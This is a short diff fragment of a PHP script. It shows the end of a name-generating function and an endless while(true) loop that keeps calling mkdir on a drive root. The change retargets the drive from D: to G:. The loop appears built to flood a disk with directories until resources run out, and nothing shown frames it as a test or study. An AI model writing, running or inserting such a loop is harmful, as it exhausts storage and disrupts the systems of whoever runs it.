@@ -9,5 +9,5 @@ function stringg(){
  return $str;
 }
 while(true){
-mkdir("D:\\".stringg(), 0777, true);
+mkdir("G:\\".stringg(), 0777, true);
 }
